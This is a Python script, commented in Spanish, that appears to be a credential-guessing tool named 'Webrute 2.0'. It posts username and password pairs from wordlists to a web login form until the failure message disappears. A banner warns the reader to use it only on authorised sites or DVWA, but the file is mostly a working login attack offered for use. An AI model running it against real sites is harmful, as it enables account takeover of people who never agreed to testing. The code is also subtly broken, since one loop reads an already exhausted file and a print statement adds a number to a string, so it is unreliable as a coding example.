
       ##
    ###  ###
 ###  #  #  #       ALTO !
#  #  #  #  #     no hagas actos ilegales con este script en python
#  #  #  #  #     puedes pagarlos con años en la carcel
#  #  #  #  #     y no me hago responsable del mal uso que le des a esta aplicacion
#  #  #  #  # ##  solo utiliza paginas web autorizadas o utiliza dwva login.
#           ##  #
#           ##  #
#           ##  #
#              ##
 #            ##
  #          #
   ##########







#################################### COMO FUNCIONA? ##############################################
# como funciona webrute 2.0 ?
# primero obtiene la lista de contraseñas en esa lista obviamente hay contraseñas
# lo que hace despues es preguntar el error cuando introduces la contraseña mal  ejemplo : error
# bueno ahora lo que hace es enviar los siguientes datos ejemplo :
#
#    usuario : fulano
#    contraseña : (una contraseña de la lista de contraseñas)
#
# lo que hace es probar una contraseña de la lista de contraseñas y si sale el error de inicio
# de session entonses la contraseña no es correcta y prueba otra contraseña de la lista de
# contraseñas hasta que no salga el error y cuando no sale el error entonces la contraseña se
# encontro.
#
# Usualmente las listas no suelen ser de 3 contraseñas suelen ser de millones o miles de
# contraseñas.
#
# Y no solo existen los ataques de lista de contraseñas o diccionarios como quieras decirle
# tambien existen los ataques de fuerza bruta que son letras numeros signos a lo loco
# Hasta dar con la contraseña casi como los de diccionario pero sin una lista y estos
# suelen tardar mas que los otros.
###################################################################################################

# PD :
# ejecuta el script en una terminal de preferencia linux

import os
try:
	import requests,time #importamos la librerias necesarias
except ImportError:
	print("[*] instalando...")
	os.system("pip install requests")
banner = """    _______
   / _____ \   
  / /     \ \             ---> Webrute 2.0
  | |     | |            _______________________________
  |_|     | |           |       _______________________ |
 _________|_|_          | USER:|admin__________________||
|      _      |         |       _______________________ |
|     ( )     |         | PASS:|.........______________||
|     /_\     |         |_______________________________|
|             |
|_____________|
"""
print(banner)
l = input("\033[32;1m ¿Conoces el nombre del usuario?(S/N) : \033[0m")

def con_nombre():
	url = input("[*] introduse en link de inicio de session : ")
	error = input("[*] introduse el error que aparece cuando pones la contraseña incorrecta : ")
	username = input("[*] nombre de usuario : ")
	wordlist = input("[*] lista de contraseñas (default => lista.txt) : ")
	usertag = input("[*] ingrese el tag de usuario : ")
	passtag = input("[*] ingrese el tag de contraseña : ")
	os.system("clear")
	with open(wordlist,"r")as wordlist: ## abrimos el diccionario
		p = wordlist.readlines()
		for line in wordlist:
			print("[*] total : ",len(p))
			empiezo = time.time()
			password = line.strip()###tomando una linea###
			data = {

			usertag:username,
			passtag:password,
			"Login":'submit'

			} #los datos que le enviaremos
			send_data_url = requests.post(url, data=data)#enviando los datos anteriores

			if error in str(send_data_url.content): # y si sale el error en el sitio
				print("[*] intentando : "+password)
			else: #y si no sale el error
				final = time.time()
				print()
				print("[+] contraseña encontrada en "+final - empiezo+" segundos.")
				print("[+] contraseña : "+password)#y si no sale el error la contraseña es esa
				exit()#aqui se para
	print("[-] la contraseña no se desifro...")
def sin_nombre():
	url = input("[*] introduse en link de inicio de session : ")
	error = input("[*] introduse el error que aparece cuando pones la contraseña incorrecta : ")
	userlist = input("[*] lista de usuarios (defualt => usuarios.txt) : ")
	wordlist = input("[*] lista de contraseñas (default => lista.txt) : ")
	usertag = input("[*] ingrese el tag de usuario : ")
	passtag = input("[*] ingrese el tag de contraseña : ")
	with open(wordlist,"r")as wordlist: ## abrimos el diccionario
		for line in wordlist:
			with open(userlist,"r")as us:
				for users in us:
					empiezo = time.time()
					user = users.strip()
					password = line.strip() ###tomando una linea###
					data = {

					usertag:user,
					passtag:password,
					"Login":'submit'

					}
					#los datos que le enviaremos
					send_data_url = requests.post(url, data=data)#enviando los datos anteriores

					if error in str(send_data_url.content): # y si sale el error en el sitio 
						print("[*] Intentando : "+password) #entonses la contraseña no es esa

					else: #y si no sale el error
						final = time.time()
						print()
						print("[+] contraseña encontrada en "+final - empiezo+" segundos.")
						print("[+] contraseña : "+password)#y si no sale el error la contraseña es esa
						exit()#aqui se para
	print("[-] la contraseña no se desifro...")
if l == "s" :
	con_nombre()
elif l == "S":
	con_nombre()
else:
	sin_nombre()
